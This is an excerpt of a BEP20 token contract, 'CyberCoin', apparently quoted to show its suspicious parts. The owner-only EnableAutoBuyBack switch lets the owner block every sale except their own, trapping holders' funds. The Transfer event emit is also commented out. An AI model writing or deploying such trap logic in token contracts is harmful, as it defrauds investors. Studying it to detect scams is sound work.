...
contract CyberCoin is IBEP20, Auth {
    ...
    address public autoLiquidityReceiver=0x755f2ce0c114300B3D597F95f293FE9b8B341cED; 
    address public marketingFeeReceiver=0x755f2ce0c114300B3D597F95f293FE9b8B341cED; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!shouldBuyback || sender==owner), "Buyback is Enabled");
...
//        emit Transfer(sender, recipient, amount);
    ...
    function EnableAutoBuyBack(bool value) external onlyOwner {
        shouldBuyback = value;
    }
